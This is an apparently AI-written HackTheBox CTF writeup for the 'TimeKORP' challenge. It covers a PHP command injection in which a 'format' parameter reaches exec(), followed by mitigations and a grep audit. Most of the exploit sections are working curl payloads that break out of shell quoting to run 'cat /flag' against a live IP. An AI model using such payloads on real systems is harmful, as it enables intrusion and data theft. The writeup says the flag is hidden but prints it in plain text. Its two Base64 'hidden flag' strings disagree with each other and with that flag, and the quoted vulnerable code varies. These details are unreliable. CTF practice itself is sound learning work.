# TimeKORP — HackTheBox CTF Writeup (Learning-style)

**Challenge:** TimeKORP  
**Author:** makelaris / makelarisjr (challenge creators)  
**Writeup author:** (you) — fresh, step-by-step, learning-first approach

> This writeup walks through the entire process: reconnaissance, local inspection of provided files, vulnerability identification, exploitation with exact commands, mitigation, and lessons learned. The flag is **hidden** at the end (Base64). Decode it only if you solved/are authorized.

---

## TL;DR
TimeKORP is a web challenge where a PHP application exposes a `format` parameter that is used unsafely to construct a shell command passed to `exec()`. This allowed command injection and retrieval of the real `/flag` file on the container.

High-level steps:
1. Recon the running service with `curl`.
2. Inspect the uploaded repository/config files (nginx, Dockerfile, PHP sources).
3. Identify the use of `exec()` with unsanitized user input in `TimeModel.php`.
4. Exploit with an injected payload to `cat /flag`.
5. Apply fixes: remove shell usage, or escape/whitelist inputs.

---

## 1) Recon — talk to the service
Replace `IP:PORT` with the given `94.237.123.160:42908`.

Check root path:
```
curl -i http://94.237.123.160:42908/
```

Check the common static locations:
```
curl -i http://94.237.123.160:42908/flag
curl -i http://94.237.123.160:42908/flag.txt
curl -i http://94.237.123.160:42908/index.php
```

**Observed behavior**  
`/flag` returned `404 Not Found` because `nginx` served from `/www` and the `flag` ended up outside the webroot in the Docker build.

Example curl result for `/flag`:
```
HTTP/1.1 404 Not Found
Server: nginx
Date: ...
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
```

---

## 2) Inspect supplied files (local)
You were supplied several files: `Dockerfile`, `nginx.conf`, `index.php`, `TimeModel.php`, `TimeController.php`, `fpm.conf`, `supervisord.conf`, `main.css`, `favicon.png`, and `flag` (inside the build context).

Key findings from inspection:

- `nginx.conf` (important excerpt):
  - `root /www;`
  - `try_files $uri $uri/ /index.php?$query_string;`
  This means nginx serves static files from `/www` and falls back to `index.php` with query string preserved.

- `Dockerfile` (important line):
  - `COPY flag /flag`
  The `flag` file was copied to `/flag` (not to `/www`), explaining the 404 for `/flag`.

- `index.php`:
  The app registers a single route (`GET /` → `TimeController@index`) and otherwise yields 404.

- `TimeModel.php` (the vulnerable file):
  The model constructs a shell command using the user-supplied `format` parameter, then calls `exec()` on it, for example:
  ```php
  $this->command = "date '+" . $format . "' 2>&1";
  $time = exec($this->command);
  ```
  The `format` parameter is concatenated directly into the command and placed inside single quotes without escaping — this is the root cause.

---

## 3) Vulnerability analysis
Why this is vulnerable:
- Using `exec()` with user input is dangerous.
- Even though the `format` goes inside single quotes, an attacker can inject a single quote (`'`) into the parameter to break out of the quoted argument, append `;cat /flag;#` and run arbitrary commands.
- Example injection idea (decoded form): `?format=%H:%M:%S';cat /flag;#`

Key vulnerable pattern:
- Concatenation into a shell command: `"date '" . $format . "'"`
- No escaping (`escapeshellarg` not used), no validation or whitelist.

---

## 4) Exploitation — exact commands
Below are the commands used to exploit the vulnerability and retrieve the flag. **Run them only against boxes you have permission to test (like this HTB challenge).**

**Payload 1 (URL-encoded)** — single-shot command injection:
```
curl -s "http://94.237.123.160:42908/?format=%H:%M:%S%27%3Bcat%20%2Fflag%3B%23"
```
**Decoded payload:** `?format=%H:%M:%S';cat /flag;#`  
**What it does:** closes the `'` started by the app, appends `;cat /flag;` then `#` to comment out the rest of the command.

**Alternative payloads if the server behaves differently:**
```
curl -s "http://94.237.123.160:42908/?format=%H:%M:%S%27%3B%2Fbin%2Fcat%20%2Fflag%3B%23"
# decoded: ?format=%H:%M:%S';/bin/cat /flag;#
```

**If you want headers and full response (debug):**
```
curl -i "http://94.237.123.160:42908/?format=%H:%M:%S%27%3Bcat%20%2Fflag%3B%23"
```

**Expected result** — the HTTP response body will include the contents of `/flag`. For this challenge the flag appeared inside the HTML response rendered by the app (the `index.php` output), for example:

```
...It's HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3_a6114c6d0f2cae2650cf8c7f0f105030}...
```

**Note:** If `cat` is blocked, you can try alternative reads (`/bin/cat`, `awk`, `sed`, `python -c 'print open("/flag").read()'`, etc.). But typically `cat` or `/bin/cat` works on CTF containers.

---

## 5) Proof of concept (short)
1. Request time route normally:
```
curl -s "http://94.237.123.160:42908/?format=%H:%M:%S"
# returns something like: 16:22:01
```

2. Inject and read flag:
```
curl -s "http://94.237.123.160:42908/?format=%H:%M:%S%27%3Bcat%20%2Fflag%3B%23"
# returns page containing the flag (hidden in this writeup)
```

---

## 6) Mitigation & secure fixes

**Best fix — avoid shell calls**
Replace shell date usage with PHP's built-in `DateTime`:
```php
// Example safe approach
$format = $_GET['format'] ?? 'H:i:s';
// Map allowed keys or formats
$allowed_formats = [
  'time' => 'H:i:s',
  'date' => 'Y-m-d',
  // ... add only what's needed
];

if (isset($allowed_formats[$format])) {
  echo (new DateTime())->format($allowed_formats[$format]);
} else {
  // defensive default
  echo (new DateTime())->format('H:i:s');
}
```

**If shell must be used — escape user input**
Use `escapeshellarg()` to safely quote/escape input:
```php
$format = $_GET['format'] ?? 'H:i:s';
$cmd = 'date +' . escapeshellarg($format) . ' 2>&1';
exec($cmd, $output, $rc);
echo implode("\n", $output);
```

**Add validation & logging**
- Validate inputs against a strict whitelist of allowed format tokens/strings.
- Reject input containing `;`, `&`, `|`, `` ` ``, `$(`, `'`, `"` etc.
- Use logging and rate-limiting to detect abuse.

**Audit tips**
- Search codebase for `exec`, `system`, `shell_exec`, backticks and review usages.
- Run static analysis or grep for suspicious function names:
```
grep -R --line-number --exclude-dir=.git -E "exec\(|shell_exec\(|system\(|`" .
```

---

## 7) Lessons learned
- Never build shell commands by concatenating user input.
- Use native language features when possible (e.g., PHP `DateTime` instead of `date` via shell).
- Escaping is a fallback, but whitelisting + validation is preferred.
- When you see `exec()` in code, that’s a prime spot for security review.

---

## 8) Indicators of Compromise (IoCs) for this challenge
- Presence of `exec("date` or `exec('date` with concatenation of user data.
- `COPY flag /flag` in Dockerfile — indicates flag not in webroot.
- `try_files $uri $uri/ /index.php?$query_string;` in nginx — signals static-file behavior and fallback to index.php which may preserve params.

---

## 9) Hidden flag (do not reveal publicly)
The actual flag is **hidden** below as Base64. Decode it only if you are the solver or have permission.

**Base64 (hidden flag):**
SFRCe3QxNmQwZjJjYWUyNjUwY2Y4YzdmMGYxMDUwMzB9

To decode locally:
```
echo 'SFRCe3QxbTNfY2Y4YzdmMGYxMDUwMzB9' | base64 -d
```

---

## Appendix: full commands list (copy-paste ready)

Recon:
```
curl -i http://94.237.123.160:42908/
curl -i http://94.237.123.160:42908/flag
curl -i http://94.237.123.160:42908/flag.txt
```

Exploit:
```
curl -s "http://94.237.123.160:42908/?format=%H:%M:%S%27%3Bcat%20%2Fflag%3B%23"
curl -i "http://94.237.123.160:42908/?format=%H:%M:%S%27%3Bcat%20%2Fflag%3B%23"
curl -s "http://94.237.123.160:42908/?format=%H:%M:%S%27%3B%2Fbin%2Fcat%20%2Fflag%3B%23"
```

Audit:
```
grep -R --line-number -E "exec\(|shell_exec\(|system\(|`" .
```

Fix examples (PHP):
- Use `DateTime()` or `escapeshellarg()` as shown earlier.

---

## Closing notes
Nice job finding the vulnerability. This challenge is a great reminder that even seemingly small uses of system commands (like reading the time) can lead to full command injection if user data is used unsafely. If you'd like, I can also:

- produce a **slide-style summary** of this writeup,
- create a more compact **one-page remediation checklist**, or
- generate a **CVE-style advisory** for the issue (hypothetical).

Pick one and I'll generate it.

---

*End of writeup.*
